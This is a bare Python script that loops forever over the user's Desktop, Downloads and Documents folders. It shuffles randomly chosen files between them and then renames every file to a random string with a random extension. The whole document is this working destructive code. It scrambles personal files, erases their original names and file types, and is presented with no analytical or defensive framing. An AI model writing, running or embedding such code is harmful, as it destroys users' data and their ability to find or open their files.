import os
import random
import shutil
import time

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
download_path = os.path.join(os.path.expanduser("~"), "Downloads")
documents_path = os.path.join(os.path.expanduser("~"), "Documents")


characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=[]{};,.~`"
while True:
    extensions = [
        ".txt",
        ".jpg",
        ".png",
        ".pdf",
        ".docx",
        ".xlsx",
        ".pptx", 
        ".mp3", 
        ".mp4", 
        ".avi", 
        ".mkv", 
        ".zip", 
        ".rar", 
        ".7z", 
        ".tar", 
        ".gz", 
        ".html", 
        ".css", 
        ".js", 
        ".json", 
        ".xml",
        ".csv",
        ".exe",
        ".bat",
        ".sh",
        ".iso",
        ".dll",
        ".apk",
        ".dmg",
        ".psd",
        ".ai",
        ".eps",
        ".indd",
        ".rtf",
        ".wav",
        ".flac",
        ".ogg",
        ".mov",
        ".wmv",
        ".flv",
        ".m4v",
        ".vob",
        ".ts",
        ".m2ts",
        ".webm",
        ".epub",
        ".mobi",
        ".azw",
        ".azw3",
        ".fb2",
        ".djvu",
        ".torrent",
        ]
    desktop_files =[
        f for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f)) and any(f.endswith(ext) for ext in extensions)
    ]
    download_files = [
        f for f in os.listdir(download_path) if os.path.isfile(os.path.join(download_path, f)) and any(f.endswith(ext) for ext in extensions)
    ]
    documents_files = [
        f for f in os.listdir(documents_path) if os.path.isfile(os.path.join(documents_path, f)) and any(f.endswith(ext) for ext in extensions)
    ]
    if desktop_files and download_files and documents_files:
        chosen_desktop_file = random.choice(desktop_files)
        chosen_download_file = random.choice(download_files)
        chosen_documents_file = random.choice(documents_files)

        temp_file = os.path.join(
            desktop_path,
            "__temp_" + "".join(random.choices(characters, k=12))
        )

        shutil.move(
            os.path.join(desktop_path, chosen_desktop_file),
            temp_file
        )

        shutil.move(
            os.path.join(download_path, chosen_download_file),
            os.path.join(desktop_path, chosen_download_file)
        )

        shutil.move(
            temp_file,
            os.path.join(download_path, chosen_desktop_file)
        )

        shutil.move(
            os.path.join(documents_path, chosen_documents_file),
            os.path.join(desktop_path, chosen_documents_file)
        )
        desktop_files = [
            f for f in os.listdir(desktop_path)
            if os.path.isfile(os.path.join(desktop_path, f))
        ]

        download_files = [
            f for f in os.listdir(download_path)
            if os.path.isfile(os.path.join(download_path, f))
        ]

        documents_files = [
            f for f in os.listdir(documents_path)
            if os.path.isfile(os.path.join(documents_path, f))
        ]

        for folder, files in [
            (desktop_path, desktop_files),
            (download_path, download_files),
            (documents_path, documents_files)
        ]:
            for file in files:
                new_name = (
                    random.choice(characters)
                    + "".join(random.choices(characters, k=7))
                    + random.choice(extensions)
                )

                new_path = os.path.join(folder, new_name)

                if not os.path.exists(new_path):
                    shutil.move(
                        os.path.join(folder, file),
                        new_path
                    )
                time.sleep(0.1)
